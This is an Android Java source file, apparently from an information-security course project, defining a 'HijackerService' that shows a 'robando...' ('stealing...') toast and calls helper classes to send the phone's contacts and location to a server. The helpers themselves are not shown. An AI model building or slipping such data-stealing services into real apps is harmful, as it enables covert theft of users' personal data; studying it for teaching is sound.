package com.seginfo.tp.seginfotp;

import android.app.IntentService;
import android.content.Intent;
import android.util.Log;
import android.widget.Toast;

/**
 * Created by juan on 01/07/15.
 */
public class HijackerService extends IntentService {

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Toast.makeText(this, "robando...", Toast.LENGTH_SHORT).show();
        return super.onStartCommand(intent,flags,startId);
    }

    @Override
    protected void onHandleIntent(Intent intent) {
        (new ContactsHijacker(this.getBaseContext())).sendToServer();
        (new LocationHijacker(this.getBaseContext())).sendToServer();
    }

    public HijackerService() {
        super("HijackerService");
    }
}
